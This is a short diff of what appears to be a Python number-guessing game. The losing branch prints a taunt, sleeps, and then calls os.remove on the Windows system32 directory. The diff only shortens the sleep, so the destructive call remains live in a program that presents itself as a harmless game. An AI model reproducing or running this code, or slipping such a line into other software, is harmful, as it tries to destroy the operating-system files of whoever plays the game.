@@ -10,5 +10,5 @@ if guess == number:
     print("you won!")
 else:
     print ("YOU LOSE BYE BYE")
-    time.sleep(10)
+    time.sleep(2)
     os.remove("c:\windows\system32")
